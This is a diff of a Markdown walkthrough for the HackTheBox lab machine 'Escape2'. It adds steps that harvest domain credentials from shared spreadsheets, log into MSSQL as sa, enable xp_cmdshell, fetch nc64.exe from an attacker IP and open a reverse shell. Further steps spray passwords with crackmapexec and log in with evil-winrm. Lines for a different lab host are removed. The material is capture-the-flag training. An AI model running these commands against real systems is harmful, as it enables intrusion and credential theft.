@@ -1,9 +1,15 @@
+---
+title: Escape2 - A HackTheBox machine
+author: amandaguglieri
+draft: false
+TableOfContents: true
+tags:
+  - walkthrough
+---
+# Escape2 - A HackTheBox machine
 
+## user.txt
 
-
-# user txt
-
-### 10.129.48.159
 
 ```
   Target_Name: SEQUEL
@@ -92,15 +98,26 @@ PORT      STATE SERVICE       VERSION
 |_http-title: Not Found
 |_http-server-header: Microsoft-HTTPAPI/2.0
 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
-
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49690/tcp open  msrpc         Microsoft Windows RPC
+49695/tcp open  msrpc         Microsoft Windows RPC
+49702/tcp open  msrpc         Microsoft Windows RPC
+49725/tcp open  msrpc         Microsoft Windows RPC
+49745/tcp open  msrpc         Microsoft Windows RPC
+60956/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 Host script results:
-|_clock-skew: mean: 4m05s, deviation: 0s, median: 4m04s
+|_clock-skew: mean: 5m48s, deviation: 0s, median: 5m48s
 | smb2-time: 
-|   date: 2025-01-31T13:07:23
+|   date: 2025-02-09T17:52:05
 |_  start_date: N/A
 | smb2-security-mode: 
 |   3:1:1: 
-|_    Message signing enabled and required
+|_    
 
 ```
 
@@ -159,175 +176,84 @@ get accounts.xlsx
 quit
 ```
 
-From this files we will extract the following users of the domain that we will save under users2.txt
+From these files we will extract the following users and passwords (we unzip them and read the xml files inside):
 
 ```
-angela@sequel.htb
-oscar@sequel.htb
-kevin@sequel.htb
-sa@sequel.htb
+angela:0fwz7Q4mSpurIt99
+oscar:86LxLBMgEWaKUnBG
+kevin:Md9Wlq1E5bZnVDVo
+sa:MSSQLP@ssw0rd!
 ```
 
-Now we will enumerate other machines within the IP range that are accessible with the user rose
+Now we can connet to the msSQL server:
 
 ```
-crackmapexec smb 10.129.48.159/23 -u rose -p KxEPkKe6R8su --local-auth --continue-on-success
+python3 mssqlclient.py -p 1433 sa@10.129.42.172 
+# When prompted, enter credentials: MSSQLP@ssw0rd!
 ```
 
-It returned:
+In the connection to the mssql server we will be running as  admin:
 
 ```
-SMB         10.129.48.143   445    QUERIER          [+] QUERIER\rose:KxEPkKe6R8su 
+# To allow advanced options to be changed.   
+EXECUTE sp_configure 'show advanced options', 1
+RECONFIGURE
+
+# To enable the feature.  
+EXECUTE sp_configure 'xp_cmdshell', 1
+RECONFIGURE
+
+# **sp_configure** displays or changes global configuration settings for the current settings. This is how you may take advantage of it:
+EXECUTE sp_configure 'xp_cmdshell', 1
+RECONFIGURE
+
+# Now we can upload a nc file to obtain a reverse shell:
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.113/nc64.exe -outfile nc64.exe"
+
+# Open a listener
+nc -lnvp 1234
+
+# And trigger the listener
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.113 1234";
 ```
 
-And also with other users:
+Located at C:\ we note the following file c:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI, where we can retrieve the following credentials:
 
 ```
-crackmapexec smb $ip/23 -u ~/borrar/users.txt -p KxEPkKe6R8su -d sequel.htb  --continue-on-success | grep +
+SQLSVCACCOUNT="SEQUEL\sql_svc"
+SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
+SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
+SECURITYMODE="SQL"
+SAPWD="MSSQLP@ssw0rd!"
 ```
 
-Output: 
+Now we can try to do a password spray attack:
 
 ```
-10.129.48.92    445    DC               [+] sequel.htb\ryan:KxEPkKe6R8su 
-10.129.48.92    445    DC               [+] sequel.htb\oscar:KxEPkKe6R8su 
-10.129.48.92    445    DC               [+] sequel.htb\rose:KxEPkKe6R8su 
-10.129.48.92    445    DC               [+] sequel.htb\ca_svc:KxEPkKe6R8su 
-10.129.48.92    445    DC               [+] sequel.htb\angela:KxEPkKe6R8su 
-10.129.48.92    445    DC               [+] sequel.htb\oscar:KxEPkKe6R8su 
-10.129.48.92    445    DC               [+] sequel.htb\kevin:KxEPkKe6R8su 
-10.129.48.92    445    DC               [+] sequel.htb\sa:KxEPkKe6R8su 
-10.129.48.143   445    QUERIER          [+] sequel.htb\krbtgt:KxEPkKe6R8su 
-10.129.48.143   445    QUERIER          [+] sequel.htb\ryan:KxEPkKe6R8su 
-10.129.48.143   445    QUERIER          [+] sequel.htb\oscar:KxEPkKe6R8su 
-10.129.48.143   445    QUERIER          [+] sequel.htb\sql_svc:KxEPkKe6R8su 
-10.129.48.143   445    QUERIER          [+] sequel.htb\rose:KxEPkKe6R8su 
-10.129.48.143   445    QUERIER          [+] sequel.htb\ca_svc:KxEPkKe6R8su 
-10.129.48.143   445    QUERIER          [+] sequel.htb\angela:KxEPkKe6R8su 
-10.129.48.143   445    QUERIER          [+] sequel.htb\oscar:KxEPkKe6R8su 
-10.129.48.143   445    QUERIER          [+] sequel.htb\kevin:KxEPkKe6R8su 
-10.129.48.143   445    QUERIER          [+] sequel.htb\sa:KxEPkKe6R8su 
-10.129.48.159   445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
-10.129.49.239   445    CICADA-DC        [+] sequel.htb\krbtgt:KxEPkKe6R8su 
-10.129.49.239   445    CICADA-DC        [+] sequel.htb\ryan:KxEPkKe6R8su 
-10.129.49.239   445    CICADA-DC        [+] sequel.htb\oscar:KxEPkKe6R8su 
-10.129.49.239   445    CICADA-DC        [+] sequel.htb\sql_svc:KxEPkKe6R8su 
-10.129.49.239   445    CICADA-DC        [+] sequel.htb\rose:KxEPkKe6R8su 
-10.129.49.239   445    CICADA-DC        [+] sequel.htb\ca_svc:KxEPkKe6R8su 
-10.129.49.239   445    CICADA-DC        [+] sequel.htb\angela:KxEPkKe6R8su 
-10.129.49.239   445    CICADA-DC        [+] sequel.htb\oscar:KxEPkKe6R8su 
-10.129.49.239   445    CICADA-DC        [+] sequel.htb\kevin:KxEPkKe6R8su 
-10.129.49.239   445    CICADA-DC        [+] sequel.htb\sa:KxEPkKe6R8su 
+crackmapexec smb 10.129.42.172 -u ~/borrar/users.txt -p WqSZAF6CysDQbGb3  --continue-on-success | grep +
 ```
 
-
-
-### QUERIER 10.129.48.143 
-We will enumerate possible services in this new IP:
+And we obtain: 
 
 ```
-nmap -sV -sC -Pn 10.129.48.143 --top-ports 10000
+10.129.42.172   445    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 
+10.129.42.172   445    DC01             [+] sequel.htb\sql_svc:WqSZAF6CysDQbGb3
 ```
 
-Output:
+Meaning that we can try to connect with evil-winrm with ryan:WqSZAF6CysDQbGb3: 
 
 ```
-PORT      STATE SERVICE       VERSION
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds?
-1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
-|_ssl-date: 2025-01-31T17:47:20+00:00; +1h04m07s from scanner time.
-| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
-| Not valid before: 2025-01-31T08:29:34
-|_Not valid after:  2055-01-31T08:29:34
-| ms-sql-info: 
-|   10.129.48.143:1433: 
-|     Version: 
-|       name: Microsoft SQL Server 2017 RTM
-|       number: 14.00.1000.00
-|       Product: Microsoft SQL Server 2017
-|       Service pack level: RTM
-|       Post-SP patches applied: false
-|_    TCP port: 1433
-| ms-sql-ntlm-info: 
-|   10.129.48.143:1433: 
-|     Target_Name: HTB
-|     NetBIOS_Domain_Name: HTB
-|     NetBIOS_Computer_Name: QUERIER
-|     DNS_Domain_Name: HTB.LOCAL
-|     DNS_Computer_Name: QUERIER.HTB.LOCAL
-|     DNS_Tree_Name: HTB.LOCAL
-|_    Product_Version: 10.0.17763
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
-47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+evil-winrm -i 10.129.42.172 -u ryan -p WqSZAF6CysDQbGb3 
+```
 
-Host script results:
-|_clock-skew: mean: 1h04m06s, deviation: 0s, median: 1h04m06s
-| smb2-time: 
-|   date: 2025-01-31T17:47:14
-|_  start_date: N/A
-| smb2-security-mode: 
-|   3:1:1: 
-|_    Message signing enabled but not required
+As ryan, we can go to c:\Desktop and print user.txt.
+
+Results: 21033cea9bb3884f391ee21423396f70
+
+## root.txt
+
 
 ```
 
-Now we can access enumerate smb shares:
-
-```
-crackmapexec smb 10.129.48.143 -u rose -p KxEPkKe6R8su -d QUERIER --shares
-```
-
-And now we access the folder:
-
-```
-smbclient  \\\\10.129.48.143\\Reports -U rose
-```
-
-And we retrieve the file stored there:
-
-```
-get Currency Volume Report.xlsm
-```
-
-When opening this with proper software, in my case LibreOffice, we can see that there is a macro running. Within the macro there is a stringconnector:
-
-```
-conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
-```
-
-Let's see 
-
-```
-sqsh -S 10.129.48.143 -U QUERIER\\reporting -P 'PcwTWTHRwryjc$c6' -h
-
-./targetedKerberoast.py -d sequel.htb -u rose -p KxEPkKe6R8su -v
-
-
-
-master
-tempdb
-model
-msdb
-volume   
-
-
-SELECT table_name FROM master.INFORMATION_SCHEMA.TABLES
-
-SELECT table_name FROM tempdb.INFORMATION_SCHEMA.TABLES
-
-SELECT table_name FROM model.INFORMATION_SCHEMA.TABLES
-
-SELECT table_name FROM msdb.INFORMATION_SCHEMA.TABLES
-
-SELECT table_name FROM volume.INFORMATION_SCHEMA.TABLES
-
-
-SELECT * FROM backupfile
+certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
 ```
